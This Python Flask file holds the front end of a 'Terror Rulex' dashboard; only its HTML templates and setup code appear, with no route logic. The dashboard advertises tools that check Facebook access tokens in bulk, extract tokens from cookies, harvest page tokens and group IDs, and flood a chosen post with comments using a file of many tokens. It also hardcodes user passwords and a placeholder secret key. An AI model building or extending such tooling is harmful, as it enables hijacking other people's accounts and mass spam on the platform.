from flask import Flask, request, render_template_string, redirect, session, url_for, flash
import requests
import threading
import time
import json
from functools import wraps

app = Flask(__name__)
app.secret_key = 'your_very_secure_secret_key_here'

# Editable user database
USERS = {
    "Terror": "Rulex",
    "user1": "pa3",
    "stuner": "asad"
}

# Global variables for tasks
tasks = {}
chat_tasks = {}

class TokenResult:
    def __init__(self, message, valid, token=None):
        self.message = message
        self.valid = valid
        self.token = token


# ---------------- TEMPLATES ----------------
login_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - TERROR</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        :root {
            --primary-color: #6a11cb;
            --secondary-color: #2575fc;
            --dark-color: #2c3e50;
            --light-color: #ecf0f1;
            --accent-color: #ff6b6b;
        }
        
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }
        
        /* Animated background */
        .background-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.5;
        }
        
        .background-animation span {
            position: absolute;
            width: 20px;
            height: 20px;
            background: var(--primary-color);
            border-radius: 50%;
            opacity: 0.3;
            animation: move 15s infinite linear;
        }
        
        .background-animation span:nth-child(1) {
            top: 20%;
            left: 20%;
            animation-delay: 0s;
            width: 40px;
            height: 40px;
        }
        
        .background-animation span:nth-child(2) {
            top: 60%;
            left: 80%;
            animation-delay: 1.5s;
            background: var(--secondary-color);
        }
        
        .background-animation span:nth-child(3) {
            top: 40%;
            left: 40%;
            animation-delay: 5s;
            width: 60px;
            height: 60px;
            background: var(--accent-color);
        }
        
        .background-animation span:nth-child(4) {
            top: 70%;
            left: 30%;
            animation-delay: 3s;
            width: 30px;
            height: 30px;
        }
        
        .background-animation span:nth-child(5) {
            top: 30%;
            left: 70%;
            animation-delay: 7s;
            width: 50px;
            height: 50px;
        }
        
        @keyframes move {
            0% {
                transform: translate(0, 0) rotate(0deg);
                opacity: 0.2;
            }
            50% {
                transform: translate(100px, 100px) rotate(180deg);
                opacity: 0.5;
            }
            100% {
                transform: translate(0, 0) rotate(360deg);
                opacity: 0.2;
            }
        }
        
        .cover {
            width: 100%;
            height: 250px;
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.3)), url('https://images.unsplash.com/photo-1518837695005-2083093ee35b?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80') no-repeat center center;
            background-size: cover;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            box-shadow: 0 5px 25px rgba(0,0,0,0.2);
        }
        
        .cover::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100px;
            background: linear-gradient(to top, #f4f6f9, transparent);
            z-index: 1;
        }
        
        .owner-name {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: white;
            font-size: 2rem;
            font-weight: 700;
            text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
            z-index: 2;
            letter-spacing: 2px;
            text-transform: uppercase;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from {
                text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px var(--primary-color), 0 0 20px var(--primary-color);
            }
            to {
                text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px var(--secondary-color), 0 0 40px var(--secondary-color);
            }
        }
        
        .card {
            margin: -80px auto 50px auto;
            max-width: 450px;
            border-radius: 20px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
            background: rgba(255, 255, 255, 0.95);
            position: relative;
            z-index: 10;
            overflow: hidden;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        
        .card-header {
            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
            color: white;
            text-align: center;
            padding: 25px;
            border-bottom: none;
            position: relative;
        }
        
        .card-header h3 {
            margin: 0;
            font-weight: 600;
            font-size: 1.8rem;
        }
        
        .card-body {
            padding: 30px;
        }
        
        .form-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        .form-label {
            font-weight: 500;
            margin-bottom: 8px;
            color: var(--dark-color);
            display: flex;
            align-items: center;
        }
        
        .form-label i {
            margin-right: 10px;
            color: var(--primary-color);
        }
        
        .form-control {
            border-radius: 10px;
            padding: 12px 15px 12px 45px;
            border: 2px solid #e1e5eb;
            transition: all 0.3s;
            font-size: 1rem;
        }
        
        .form-control:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 0.2rem rgba(106, 17, 203, 0.15);
        }
        
        .input-icon {
            position: absolute;
            left: 15px;
            top: 40px;
            color: var(--primary-color);
            font-size: 1.2rem;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
            border: none;
            border-radius: 10px;
            padding: 12px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(106, 17, 203, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(106, 17, 203, 0.4);
            background: linear-gradient(135deg, var(--secondary-color) 0%, var(--primary-color) 100%);
        }
        
        .btn-primary:active {
            transform: translateY(1px);
        }
        
        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }
        
        .btn-primary:hover::before {
            left: 100%;
        }
        
        .fade-in {
            animation: fadeIn 0.8s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .footer {
            text-align: center;
            margin-top: auto;
            padding: 20px;
            color: var(--dark-color);
            font-size: 0.9rem;
        }
        
        @media (max-width: 576px) {
            .card {
                margin: -50px 15px 30px 15px;
                max-width: 100%;
            }
            
            .cover {
                height: 200px;
            }
            
            .owner-name {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="background-animation">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
    </div>
    
    <div class="cover">
        <div class="owner-name">Terror Rulex</div>
    </div>
    
    <div class="container">
        <div class="card fade-in">
            <div class="card-header">
                <h3><i class="fas fa-user-lock"></i> Login</h3>
            </div>
            <div class="card-body">
                {% with messages = get_flashed_messages(with_categories=true) %}
                  {% if messages %}
                    {% for category, message in messages %}
                      <div class="alert alert-{{ category }} alert-dismissible fade show" role="alert">
                        {{ message }}
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                      </div>
                    {% endfor %}
                  {% endif %}
                {% endwith %}
                <form method="POST">
                    <div class="form-group mb-4">
                        <label class="form-label"><i class="fas fa-user"></i> Username</label>
                        <div class="position-relative">
                            <input type="text" class="form-control" name="username" required>
                            <div class="input-icon">
                                <i class="fas fa-user"></i>
                            </div>
                        </div>
                    </div>
                    <div class="form-group mb-4">
                        <label class="form-label"><i class="fas fa-key"></i> Password</label>
                        <div class="position-relative">
                            <input type="password" class="form-control" name="password" required>
                            <div class="input-icon">
                                <i class="fas fa-lock"></i>
                            </div>
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary w-100">
                        <i class="fas fa-sign-in-alt"></i> Login
                    </button>
                </form>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <p>© 2023 TERROR WEB<i class="fas fa-heart" style="color: var(--accent-color);"></i></p>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
"""

index_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>T3RROR DASHB0RD</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(135deg, #0f0f0f, #1e1e2e);
      min-height: 100vh;
      font-family: "Poppins", sans-serif;
      color: #fff;
    }
    .navbar {
      background: rgba(20,20,20,0.8);
      backdrop-filter: blur(10px);
    }
    .navbar-brand {
      color: #fff !important;
      font-weight: 700;
      letter-spacing: 1px;
    }
    .logout-btn {
      position: fixed;
      top: 30px;
      right: 25px;
      z-index: 1100;
      background: #000 !important;
      border: none;
      font-weight: 600;
      border-radius: 8px;
      padding: 10px 18px;
    }
    .logout-btn:hover {
      background: #222 !important;
    }
    .dashboard-header {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(12px);
      border-radius: 15px;
      padding: 25px;
      margin: 25px auto;
      max-width: 90%;
      text-align: center;
      box-shadow: 0 8px 25px rgba(0,0,0,0.6);
    }
    .dashboard-banner img {
      max-width: 100%;
      border-radius: 12px;
      box-shadow: 0 5px 25px rgba(0,0,0,0.8);
    }
    .card {
      border-radius: 18px;
      overflow: hidden;
      background: rgba(255,255,255,0.08);
      backdrop-filter: blur(15px);
      transition: all 0.3s ease;
      border: none;
      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
      height: 100%;
      color: #fff; /* ðŸ”¥ Card ke andar ka text bhi white */
    }
    .card:hover {
      transform: translateY(-6px) scale(1.02);
    }
    .card-header {
      background: transparent;
      color: #fff;
      font-weight: 600;
      text-align: center;
      border-bottom: none;
    }
    .card-img-top {
      height: 160px;
      object-fit: cover;
    }
    .btn-white {
      background: #fff !important;
      color: #000 !important;
      border: none !important;
      font-weight: 600;
      border-radius: 10px;
      transition: 0.3s;
    }
    .btn-white:hover {
      background: #ddd !important;
      color: #000 !important;
    }
  </style>
</head>
<body>
  <!-- Navbar -->
  <nav class="navbar navbar-expand-lg px-3">
    <a class="navbar-brand" href="#"><i class="fas fa-skull-crossbones me-2"></i>T3RROR DASHB0RD</a>
  </nav>

  <!-- Logout Button -->
  <a href="{{ url_for('logout') }}" class="btn logout-btn">
    <i class="fas fa-sign-out-alt"></i> Logout
  </a>

  <div class="container text-center mt-4">
    <!-- Banner -->
    <div class="dashboard-banner mb-4">
      <img src="https://raw.githubusercontent.com/Faiizuxd/The_Faizu_dpz/refs/heads/main/219956.gif" alt="Banner">
    </div>

    <!-- Header -->
    <div class="dashboard-header">
      <h2 class="mb-2">Welcome, {{ session.username }}!</h2>
      <p>Terror Rulex Web Server </p>
    </div>

    <!-- Cards -->
    <div class="row justify-content-center">

      <div class="col-xl-3 col-lg-4 col-md-6 mb-4">
        <div class="card">
          <img src="https://iili.io/KT6TsoX.md.jpg" class="card-img-top">
          <div class="card-header"><i class="fas fa-comment-dots"></i> Convo Tool</div>
          <div class="card-body">
            <p>Convo Server Offline 24/7 </p>
            <a href="/chat_tool" class="btn btn-white w-100"><i class="fas fa-database"></i> Open</a>
          </div>
        </div>
      </div>

      <div class="col-xl-3 col-lg-4 col-md-6 mb-4">
        <div class="card">
          <img src="https://iili.io/KT6Tr9p.md.jpg" class="card-img-top">
          <div class="card-header"><i class="fas fa-key"></i> Token Checker</div>
          <div class="card-body">
            <p>Valid/invalid Facebook access tokens Chaker</p>
            <a href="/token_checker" class="btn btn-white w-100"><i class="fas fa-database"></i> Open</a>
          </div>
        </div>
      </div>

      <div class="col-xl-3 col-lg-4 col-md-6 mb-4">
        <div class="card">
          <img src="https://iili.io/KT6TLVn.md.jpg" class="card-img-top">
          <div class="card-header"><i class="fas fa-users"></i> Uid Generator</div>
          <div class="card-body">
            <p>Fetch your Uids Off All Groups</p>
            <a href="/fetch_groups" class="btn btn-white w-100"><i class="fas fa-database"></i> Open</a>
          </div>
        </div>
      </div>

      <div class="col-xl-3 col-lg-4 col-md-6 mb-4">
        <div class="card">
          <img src="https://iili.io/KT6T6NI.md.jpg" class="card-img-top">
          <div class="card-header"><i class="fas fa-file-code"></i> Get Page Tokens</div>
          <div class="card-body">
            <p>Get The Tokens Off Page trough The Attach id token </p>
            <a href="/get_page_tokens" class="btn btn-white w-100"><i class="fas fa-database"></i> Open</a>
          </div>
        </div>
      </div>

      <div class="col-xl-3 col-lg-4 col-md-6 mb-4">
        <div class="card">
          <img src="https://iili.io/KT6TQPs.md.jpg" class="card-img-top">
          <div class="card-header"><i class="fas fa-user-secret"></i> Get User Token</div>
          <div class="card-body">
            <p>Extract token from The cookies</p>
            <a href="/get_token" class="btn btn-white w-100"><i class="fas fa-database"></i> Open</a>
          </div>
        </div>
      </div>

      <div class="col-xl-3 col-lg-4 col-md-6 mb-4">
        <div class="card">
          <img src="https://iili.io/KT6TtKG.md.jpg" class="card-img-top">
          <div class="card-header"><i class="fas fa-paper-plane"></i> Post Tool</div>
          <div class="card-body">
            <p>This is A Post Server By Token</p>
            <a href="/post_tool" class="btn btn-white w-100"><i class="fas fa-database"></i> Open</a>
          </div>
        </div>
      </div>

      <div class="col-xl-3 col-lg-4 col-md-6 mb-4">
        <div class="card">
          <img src="https://iili.io/KT6jXEJ.md.jpg" class="card-img-top">
          <div class="card-header"><i class="fas fa-tasks"></i> Active Tasks</div>
          <div class="card-body">
            <p>Monitor running tasks</p>
            <a href="/tasks" class="btn btn-white w-100"><i class="fas fa-database"></i> View Tasks</a>
          </div>
        </div>
      </div>

    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
"""

token_checker_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>T3RROR</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    /* 🔥 Background Animation */
    body {
      margin: 0;
      min-height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(270deg, #1a1a1a, #2a2a2a, #3a1c2f, #2a2a2a);
      background-size: 600% 600%;
      animation: gradientShift 20s ease infinite;
      color: #f1f1f1;
      padding: 20px;
    }
    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* 🔥 Card Design */
    .card {
      width: 100%;
      max-width: 650px;
      border-radius: 20px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.6);
      background: rgba(25, 25, 25, 0.95);
      backdrop-filter: blur(15px);
      animation: fadeIn 0.8s ease-in-out;
      overflow: hidden;
    }

    /* 🔥 Top Banner with Image */
    .card-banner {
      position: relative;
      height: 150px;
      background: url("https://iili.io/KTPl0BV.jpg") no-repeat center center;
      background-size: cover;
    }
    .card-banner::after {
      content: "";
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.55); /* Dark overlay */
    }
    .banner-content {
      position: relative;
      z-index: 2;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 20px;
      color: #fff;
      font-size: 1.3rem;
      font-weight: 600;
    }
    .back-btn {
      background: rgba(255,255,255,0.15);
      border: none;
      color: #fff;
      padding: 8px 15px;
      border-radius: 30px;
      font-size: 1rem;
      display: flex;
      align-items: center;
      gap: 6px;
      cursor: pointer;
      transition: all 0.3s;
    }
    .back-btn:hover {
      background: #e83e8c;
      color: #fff;
    }
/* 🔥 Form Styling */
.form-label,
.form-text {
  color: #ffffff !important;
}

.form-control {
  background: #2e2e2e;
  border: 1px solid #444;
  color: #ffffff;
  border-radius: 10px;
  padding: 10px;
  transition: all 0.3s;
}
.form-control:focus {
  background: #3a3a3a;
  border-color: #e83e8c;
  box-shadow: 0 0 10px rgba(232, 62, 140, 0.6);
  color: #ffffff;
}

/* 🔥 Results Table */
.table {
  color: #ffffff !important;
}
.table-dark th {
  background: #111 !important;
  color: #ffffff !important;
}

/* 🔥 General text fix */
body, .card-body, .banner-content, .card {
  color: #ffffff !important;
}
    /* 🔥 Button */
    .btn-checker {
      background: #e83e8c;
      border: none;
      border-radius: 50px;
      font-size: 1.1rem;
      font-weight: 600;
      padding: 12px;
      transition: all 0.3s;
      color: #fff;
    }
    .btn-checker:hover {
      background: #c2185b;
      transform: scale(1.03);
    }

    /* 🔥 Results Table */
    .table {
      color: #f1f1f1;
    }
    .table-dark th {
      background: #111 !important;
      color: #fff !important;
    }
    .valid { color: #00ff88; font-weight: bold; }
    .invalid { color: #ff4c4c; font-weight: bold; }

    /* 🔥 Animations */
    .loading-spinner {
      display: none;
      text-align: center;
      margin-top: 15px;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="card">
    <!-- Banner with back button and title -->
    <div class="card-banner">
      <div class="banner-content">
        <button onclick="window.location.href='{{ url_for('home') }}'" class="back-btn">
          <i class="fas fa-arrow-left"></i> Back
        </button>
        <span><i class="fas fa-key"></i> Token Checker</span>
      </div>
    </div>

    <!-- Form -->
    <div class="card-body p-4">
      <form id="tokenForm" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="tool" value="token_checker">
        <div class="mb-3">
          <label class="form-label">Single Token</label>
          <input type="text" class="form-control" name="single_token" placeholder="Paste one token here">
        </div>
        <div class="mb-3">
          <label class="form-label">Upload Tokens File</label>
          <input type="file" class="form-control" name="tokens_file" accept=".txt">
          <small class="form-text text-muted text-light">Text file with one token per line</small>
        </div>
        <button type="submit" class="btn btn-checker w-100">
          <i class="fas fa-check"></i> Check Tokens
        </button>
      </form>

      <!-- Loading spinner -->
      <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner-border text-light" role="status">
          <span class="visually-hidden">Loading...</span>
        </div>
        <p class="mt-2">Checking tokens...</p>
      </div>

      <!-- Results -->
      {% if token_results %}
      <h5 class="mt-4">Results:</h5>
      <div class="table-responsive">
        <table class="table table-striped table-dark">
          <thead>
            <tr>
              <th>Status</th>
              <th>Details</th>
            </tr>
          </thead>
          <tbody>
            {% for result in token_results %}
              <tr>
                <td class="{% if result.valid %}valid{% else %}invalid{% endif %}">
                  {% if result.valid %}✓ VALID{% else %}✗ INVALID{% endif %}
                </td>
                <td>{{ result.message }}</td>
              </tr>
            {% endfor %}
          </tbody>
        </table>
      </div>
      <div class="mt-3">
        <span class="badge bg-success">Valid: {{ valid_count }}</span>
        <span class="badge bg-danger">Invalid: {{ invalid_count }}</span>
      </div>
      {% endif %}
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    const form = document.getElementById('tokenForm');
    const spinner = document.getElementById('loadingSpinner');

    form.addEventListener('submit', function(e) {
      spinner.style.display = 'block';
      setTimeout(() => {
        spinner.style.display = 'none';
      }, 500); // 0.5 second loading effect
    });
  </script>
</body>
</html>
"""

fetch_groups_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TERROR</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    /* 🔥 Background Animation */
    body {
      margin: 0;
      min-height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(270deg, #1a1a1a, #2a2a2a, #3a1c2f, #2a2a2a);
      background-size: 600% 600%;
      animation: gradientShift 20s ease infinite;
      color: #fff;
      padding: 20px;
    }
    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* 🔥 Card Design */
    .card {
      width: 100%;
      max-width: 650px;
      border-radius: 20px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.6);
      background: rgba(25, 25, 25, 0.95);
      backdrop-filter: blur(15px);
      animation: fadeIn 0.8s ease-in-out;
      overflow: hidden;
    }

    /* 🔥 Top Banner with Image */
    .card-banner {
      position: relative;
      height: 150px;
      background: url("https://iili.io/KTPNI4a.jpg") no-repeat center center;
      background-size: cover;
    }
    .card-banner::after {
      content: "";
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.55); /* Dark overlay */
    }
    .banner-content {
      position: relative;
      z-index: 2;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 20px;
      color: #fff;
      font-size: 1.3rem;
      font-weight: 600;
    }
    .back-btn {
      background: rgba(255,255,255,0.15);
      border: none;
      color: #fff;
      padding: 8px 15px;
      border-radius: 30px;
      font-size: 1rem;
      display: flex;
      align-items: center;
      gap: 6px;
      cursor: pointer;
      transition: all 0.3s;
    }
    .back-btn:hover {
      background: #e83e8c;
      color: #fff;
    }

    /* 🔥 Form Styling */
    .form-label,
    .form-text {
      color: #ffffff !important;
    }
    .form-control {
      background: #2e2e2e;
      border: 1px solid #444;
      color: #ffffff;
      border-radius: 10px;
      padding: 10px;
      transition: all 0.3s;
    }
    .form-control:focus {
      background: #3a3a3a;
      border-color: #e83e8c;
      box-shadow: 0 0 10px rgba(232, 62, 140, 0.6);
      color: #ffffff;
    }

    /* 🔥 Button */
    .btn-checker {
      background: #e83e8c;
      border: none;
      border-radius: 50px;
      font-size: 1.1rem;
      font-weight: 600;
      padding: 12px;
      transition: all 0.3s;
      color: #fff;
    }
    .btn-checker:hover {
      background: #c2185b;
      transform: scale(1.03);
    }

    /* 🔥 Results Table */
    .table {
      color: #ffffff !important;
    }
    .table-dark th {
      background: #111 !important;
      color: #ffffff !important;
    }

    /* 🔥 Animations */
    .loading-spinner {
      display: none;
      text-align: center;
      margin-top: 15px;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="card">
    <!-- Banner with back button and title -->
    <div class="card-banner">
      <div class="banner-content">
        <button onclick="window.location.href='{{ url_for('home') }}'" class="back-btn">
          <i class="fas fa-arrow-left"></i> Back
        </button>
        <span><i class="fas fa-users"></i> Group Scraper</span>
      </div>
    </div>

    <!-- Form -->
    <div class="card-body p-4">
      <form id="groupForm" method="POST">
        <input type="hidden" name="tool" value="fetch_groups">
        <div class="mb-3">
          <label class="form-label">Facebook Access Token</label>
          <input type="text" class="form-control" name="token" required>
          <small class="form-text">Enter a valid Facebook access token </small>
        </div>
        <button type="submit" class="btn btn-checker w-100">
          <i class="fas fa-search"></i> Fetch Groups
        </button>
      </form>

      <!-- Loading spinner -->
      <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner-border text-light" role="status">
          <span class="visually-hidden">Loading...</span>
        </div>
        <p class="mt-2">Fetching groups...</p>
      </div>

      <!-- Error -->
      {% if group_error %}
      <div class="alert alert-danger mt-3">{{ group_error }}</div>
      {% endif %}

      <!-- Results -->
      {% if groups %}
      <div class="mt-4">
        <h5>Your Groups:</h5>
        <div class="table-responsive">
          <table class="table table-striped table-dark">
            <thead>
              <tr>
                <th>Group Name</th>
                <th>ID</th>
              </tr>
            </thead>
            <tbody>
              {% for group in groups %}
                <tr>
                  <td>{{ group.name }}</td>
                  <td><code>{{ group.id }}</code></td>
                </tr>
              {% endfor %}
            </tbody>
          </table>
        </div>
      </div>
      {% endif %}
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    const form = document.getElementById('groupForm');
    const spinner = document.getElementById('loadingSpinner');

    form.addEventListener('submit', function(e) {
      spinner.style.display = 'block';
      setTimeout(() => {
        spinner.style.display = 'none';
      }, 500); // 0.5 second loading effect
    });
  </script>
</body>
</html>
"""

post_tool_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TERROR</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    /* 🔵 Background */
    body {
      margin: 0;
      min-height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #0a1a2f, #0d2745, #12375e, #0a1a2f);
      background-size: 400% 400%;
      animation: gradientFlow 20s ease infinite;
      color: #fff;
      padding: 20px;
    }
    @keyframes gradientFlow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* 🔵 Card with glass effect */
    .card {
      width: 100%;
      max-width: 700px;
      border-radius: 18px;
      background: rgba(15, 25, 45, 0.9);
      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
      backdrop-filter: blur(15px);
      animation: fadeIn 0.8s ease-in-out;
      overflow: hidden;
    }

    /* 🔵 Logo/Header */
    .logo-bar {
      background: rgba(5, 15, 35, 0.9);
      padding: 15px 25px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 1.5rem;
      font-weight: bold;
      letter-spacing: 1px;
      color: #00eaff;
      text-shadow: 0 0 10px rgba(0, 234, 255, 0.8), 0 0 20px rgba(0, 234, 255, 0.5);
      border-bottom: 2px solid #00eaff;
    }
    .back-btn {
      background: rgba(255,255,255,0.1);
      border: none;
      color: #00eaff;
      padding: 6px 14px;
      border-radius: 30px;
      font-size: 0.95rem;
      cursor: pointer;
      transition: all 0.3s;
    }
    .back-btn:hover {
      background: #00eaff;
      color: #000;
    }

    /* 🔵 Form Styling */
    .form-label,
    .form-text {
      color: #cfe9ff !important;
    }
    .form-control {
      background: #0d213a;
      border: 1px solid #1e3d5f;
      color: #ffffff;
      border-radius: 12px;
      padding: 10px;
      transition: all 0.3s;
    }
    .form-control:focus {
      background: #12375e;
      border-color: #00eaff;
      box-shadow: 0 0 12px rgba(0, 234, 255, 0.6);
      color: #ffffff;
    }
    input[type="file"]::file-selector-button {
      background: #00eaff;
      border: none;
      color: #000;
      padding: 8px 15px;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s;
    }
    input[type="file"]::file-selector-button:hover {
      background: #00bcd4;
      color: #fff;
    }

    /* 🔵 Button */
    .btn-checker {
      background: #00eaff;
      border: none;
      border-radius: 50px;
      font-size: 1.1rem;
      font-weight: 600;
      padding: 12px;
      transition: all 0.3s;
      color: #000;
      width: 100%;
      margin-top: 10px;
    }
    .btn-checker:hover {
      background: #00bcd4;
      color: #fff;
      transform: scale(1.03);
    }

    /* 🔵 Loading Spinner */
    .loading-spinner {
      display: none;
      text-align: center;
      margin-top: 15px;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="card">
    <!-- Logo Bar -->
    <div class="logo-bar">
      <span>Terror Rulex</span>
      <button onclick="window.location.href='{{ url_for('home') }}'" class="back-btn">Back</button>
    </div>

    <!-- Form -->
    <div class="card-body p-4">
      <form id="postForm" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="tool" value="post_tool">

        <div class="mb-3">
          <label class="form-label">Post ID</label>
          <input type="text" class="form-control" name="post_id" required>
          <small class="form-text">The ID of the post 100XXXXXX_40XXXXXX</small>
        </div>

        <div class="mb-3">
          <label class="form-label">Delay (seconds)</label>
          <input type="number" class="form-control" name="delay" required min="1">
          <small class="form-text">Delay To Every Comments</small>
        </div>

        <div class="mb-3">
          <label class="form-label">Task Stop Password</label>
          <input type="text" class="form-control" name="task_password" required>
          <small class="form-text">Password to stop this task later</small>
        </div>

        <div class="mb-3">
          <label class="form-label">Upload Tokens File</label>
          <input type="file" class="form-control" name="tokens_file" required accept=".txt">
          <small class="form-text">Text file with one token per line</small>
        </div>

        <div class="mb-3">
          <label class="form-label">Upload Comments File</label>
          <input type="file" class="form-control" name="comments_file" required accept=".txt">
          <small class="form-text">Text file with one comment per line</small>
        </div>

        <button type="submit" class="btn-checker">
          Start
        </button>
      </form>

      <!-- Loading spinner -->
      <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner-border text-info" role="status">
          <span class="visually-hidden">Loading...</span>
        </div>
        <p class="mt-2">Starting task...</p>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    const form = document.getElementById('postForm');
    const spinner = document.getElementById('loadingSpinner');

    form.addEventListener('submit', function(e) {
      spinner.style.display = 'block';
      setTimeout(() => {
        spinner.style.display = 'none';
      }, 500);
    });
  </script>
</body>
</html>
"""
